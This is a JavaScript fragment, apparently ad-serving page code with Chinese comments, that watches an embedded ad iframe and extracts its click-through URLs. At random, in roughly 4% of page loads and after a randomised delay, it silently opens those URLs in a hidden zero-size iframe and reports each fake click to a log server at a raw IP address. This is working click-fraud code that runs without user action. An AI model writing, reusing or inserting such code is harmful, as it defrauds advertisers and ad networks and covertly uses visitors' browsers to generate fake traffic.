var ln = 0;
    var rca=0.0401;
    iff();
    function iff(){
        ln++; 
        if(ln<1000){
            if(document.getElementById('lfs_gad_jsdk') && document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe').length>0){ 
            	if(null != document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc')){
            		
            		if(document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('http://adx.pro.cn/c?c=').length>1){
            			
            			if(document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('http://adx.pro.cn/c?c=')[1].split('"').length>1){

                        	
                        	var rand = parseInt(Math.random()*10);//1000内的随机数
                            var u123 = "http://adx.pro.cn/c?c="+document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('http://adx.pro.cn/c?c=')[1].split('"')[0];
                            var val = getNumberInNormalDistribution(8,8);
                        	if(val<1)val=-val +2;
                            var r_b = Math.random();
                            if(r_b<=rca){
                            	 setTimeout(function(){open(u123)},(val*1000));    
                            }
                           
                        
            			}else{
            				setTimeout(arguments.callee, 200); 
            			}
            		}else if(document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('http://mmae.qtmojo.com/x').length>1){

            			
            			if(document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('http://mmae.qtmojo.com/x')[1].split('"').length>1){

                        	
                        	var rand = parseInt(Math.random()*10);//1000内的随机数
                            var u123 = "http://mmae.qtmojo.com/x"+document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('http://mmae.qtmojo.com/x')[1].split('"')[0];
                            var val = getNumberInNormalDistribution(8,8);
                        	if(val<1)val=-val +1;
                            var r_b = Math.random();
                            if(r_b<=rca){
                            	 setTimeout(function(){open(u123)},(val*1000));    
                            }
                           
                        
            			}else{
            				setTimeout(arguments.callee, 200); 
            			}
            		
            		}else{
            			if(document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html').length>1){
                            if(document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html')[1].split('>').length>1){
                            	
                            	var rand = parseInt(Math.random()*10);//1000内的随机数
                            	var code = _global_site.split("/js")[0];
                            	
	                            	var len_a =document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html')[1].split('>')[0].length;
	                            	var len_b =document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html')[1].split('"')[0].length;
	                            	
	                            	
	                            	
	                            	var rand = parseInt(Math.random()*10);//1000内的随机数
	                                var url_cli = code +"/clk2.html";
	                                
	                                if(len_a<len_b){
	                                	url_cli = url_cli +document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html')[1].split('>')[0]+"\"";
	                                }else{
	                                	url_cli = url_cli +document.getElementById('lfs_gad_jsdk').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html')[1].split('"')[0];
	
	                                }
                            	
                            	
	                                var val = getNumberInNormalDistribution(8,8);
	                            	if(val<1)val=-val +2;
                                var r_d = Math.random();
                                if(r_d<=rca){
                                	 setTimeout(function(){open(url_cli)},(val*1000));    
                                }
                               
                            }else{
                                setTimeout(arguments.callee, 200); 
                            }
                        }else{
                            setTimeout(arguments.callee, 200); 
                        }

            		}
            		
            		
            		
            	}else{
                    setTimeout(arguments.callee, 200); 
                }
                
            }else{
                setTimeout(arguments.callee, 200); 
            }
        } 
        
    }
    
    function getNumberInNormalDistribution(mean,std_dev){
    	
        return parseInt(mean+(randomNormalDistribution()*std_dev));
    }

    function randomNormalDistribution(){
        var u=0.0, v=0.0, w=0.0, c=0.0;
        do{
            u=Math.random()*2-1.0;
            v=Math.random()*2-1.0;
            w=u*u+v*v;
        }while(w==0.0||w>=1.0)
        c=Math.sqrt((-2*Math.log(w))/w);
        return u*c;
    }
    function open(urls){
    	var a = _guanggao_pub ;
    	var b = _guanggao_slot;
    	var lcurl = "http://120.27.35.52:8081/logserver/jsclk/"+a+"/"+b+"/tj_clk_monitor";
    	$.get(lcurl);
    	var ifr = document.createElement('iframe');
    	 ifr.src = urls ;
         ifr.style.display = "none" ;
         ifr.width = 0 ;
         ifr.height = 0 ; 
         document.body.appendChild(ifr);
//    	document.location.href = urls;
    }
